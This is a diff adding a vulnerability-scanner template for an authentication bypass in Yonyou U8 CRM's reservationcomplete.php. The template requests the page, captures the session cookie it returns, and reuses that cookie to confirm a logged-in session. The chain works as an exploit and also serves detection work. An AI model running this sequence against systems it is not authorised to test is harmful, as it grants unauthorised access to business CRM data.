@@ -1,0 +1,55 @@
+id: yy-u8-crm-reservationcomplete-bypass-auth
+info:
+  name: 用友U8 CRM reservationcomplete.php 绕过验证登录漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    用友U8 CRM reservationcomplete.php 绕过验证登录漏洞, which allows unauthorized access.
+  tags: unauthorized-access,crm
+  metadata:
+    product: 用友U8+CRM
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: initial-check
+    method: GET
+    path:
+      - "{{BaseURL}}/background/reservationcomplete.php?ID=1"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: regex
+        part: header
+        regex:
+          - "PHPSESSID=(?<cookie>.*?);"
+    extractors:
+      - type: regex
+        part: header
+        regex:
+          - "PHPSESSID=(?<cookie>.*?);"
+        group: 1
+        internal: true
+
+  - id: validate-login
+    method: GET
+    path:
+      - "{{BaseURL}}/"
+    headers:
+      Cookie: PHPSESSID={{cookie}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"serverName\""
+          - "登出"
